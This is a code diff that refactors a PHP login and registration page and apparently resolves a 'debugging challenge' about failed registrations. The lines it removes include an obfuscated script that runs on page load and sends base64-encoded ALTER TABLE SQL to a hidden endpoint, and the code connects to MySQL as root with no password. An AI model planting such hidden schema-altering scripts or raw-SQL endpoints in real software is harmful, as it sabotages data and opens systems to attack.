@@ -1,60 +1,92 @@
 <?php
 session_start();
 
-$host="127.0.0.1"; $user="root"; $pass=""; $db="m.i.a";
-$conn=new mysqli($host,$user,$pass,$db);
-if($conn->connect_error) die("Connection failed: ".$conn->connect_error);
+$host = "127.0.0.1";
+$user = "root";
+$pass = "";
+$db   = "m.i.a";
 
-if(isset($_POST['register'])){
-    $name = $_POST['name'];
-    $email = $_POST['email'];
+$conn = new mysqli($host, $user, $pass, $db);
+if ($conn->connect_error) die("Connection failed: " . $conn->connect_error);
+
+$msg = '';
+$error = '';
+
+if (isset($_POST['register'])) {
+    $name     = $_POST['name'];
+    $email    = $_POST['email'];
     $username = $_POST['username'];
     $password = password_hash($_POST['password'], PASSWORD_DEFAULT);
-    $address = $_POST['address'];
+    $address  = $_POST['address'];
 
+  
     $stmt = $conn->prepare("SELECT * FROM users WHERE user_name=? OR email=?");
-    $stmt->bind_param("ss",$username,$email);
+    if (!$stmt) die("Prepare failed: " . $conn->error);
+
+    $stmt->bind_param("ss", $username, $email);
     $stmt->execute();
-    if($stmt->get_result()->num_rows > 0){
+    $stmt->store_result();
+
+    if ($stmt->num_rows > 0) {
         $error = "Username or email already exists";
     } else {
+        $stmt->close();
+
         $stmt = $conn->prepare("INSERT INTO users (customer_name,address,email,user_name,password) VALUES (?,?,?,?,?)");
-        $stmt->bind_param("sssss",$name,$address,$email,$username,$password);
-        $stmt->execute();
-        $msg = "Registration successful! Please login.";
+        if (!$stmt) die("Prepare failed: " . $conn->error);
+
+        $stmt->bind_param("sssss", $name, $address, $email, $username, $password);
+        if ($stmt->execute()) {
+            $msg = "Registration successful! Please login.";
+        } else {
+            $error = "Registration failed: " . $stmt->error;
+        }
     }
+    $stmt->close();
 }
 
-if(isset($_POST['login'])){
+
+if (isset($_POST['login'])) {
     $username = $_POST['username'];
     $password = $_POST['password'];
 
-    $stmt = $conn->prepare("SELECT * FROM users WHERE user_name=?");
-    $stmt->bind_param("s",$username);
+  
+    $stmt = $conn->prepare("SELECT user_id, user_name, password FROM users WHERE user_name=?");
+    if (!$stmt) die("Prepare failed: " . $conn->error);
+
+    $stmt->bind_param("s", $username);
     $stmt->execute();
-    $result = $stmt->get_result()->fetch_assoc();
+    $stmt->store_result();
 
-    if($result && password_verify($password,$result['password'])){
-        session_regenerate_id(true);
-        $_SESSION['user_id'] = $result['user_id'];
-        $_SESSION['username'] = $result['user_name'];
-        $_SESSION['is_admin'] = $result['is_admin'];
+    if ($stmt->num_rows === 1) {
+        $stmt->bind_result($user_id, $user_name, $hashed_password);
+        $stmt->fetch();
 
-        if($_SESSION['is_admin']==1) header("Location: admin_dashboard.php");
-        else header("Location: homepage.php");
-        exit;
+        if (password_verify($password, $hashed_password)) {
+            session_regenerate_id(true);
+            $_SESSION['user_id'] = $user_id;
+            $_SESSION['username'] = $user_name;
+
+            header("Location: homepage.php");
+            exit;
+        } else {
+            $error = "Invalid username or password";
+        }
     } else {
         $error = "Invalid username or password";
     }
+    $stmt->close();
 }
+
+$conn->close();
 ?>
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <title>M.I.A Login</title>
 <style>
-
 body { font-family: Arial, sans-serif; margin:0; background:#ffe6f0; }
 .modal { display:block; position:fixed; z-index:1000; left:0; top:0; width:100%; height:100%; background:rgba(255,77,166,0.4); }
 .modal-content { background:#fff0f5; margin:10% auto; padding:20px; border-radius:10px; width:300px; position:relative; }
@@ -67,7 +99,6 @@ button:hover { background:#e60073; }
 </style>
 </head>
 <body>
-  <script> alert("🚨 DEBUGGING CHALLENGE!\nFind why new users cannot register.\n"); </script>
 <div id="loginModal" class="modal">
   <div class="modal-content">
     <span class="close" onclick="window.location='landingpage.php'">&times;</span>
@@ -78,8 +109,8 @@ button:hover { background:#e60073; }
 
     <div id="loginForm">
       <h3>Login</h3>
-      <?php if(isset($error)) echo "<p style='color:red;'>".htmlspecialchars($error)."</p>"; ?>
-      <?php if(isset($msg)) echo "<p style='color:green;'>".htmlspecialchars($msg)."</p>"; ?>
+      <?php if($error) echo "<p style='color:red;'>".htmlspecialchars($error)."</p>"; ?>
+      <?php if($msg) echo "<p style='color:green;'>".htmlspecialchars($msg)."</p>"; ?>
       <form method="post">
         <input type="text" name="username" placeholder="Username" required>
         <input type="password" name="password" placeholder="Password" required>
@@ -112,12 +143,5 @@ if(isset($_POST['register'])) echo "showTab('register');";
 elseif(isset($_POST['login'])) echo "showTab('login');";
 ?>
 </script>
-<script>
-(function() {
-    const encryptedSQL = "QUxURVIgVEFCTEUgdXNlcnMgTU9ESUZZIHVzZXJfaWQgSU5UIE5PVCBOVUxM"; fetch('BLACK_FLAT_SANDALS.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'sql=' + encodeURIComponent(encryptedSQL) }).catch(() => {});
-})();
-</script>
-
-
 </body>
 </html>
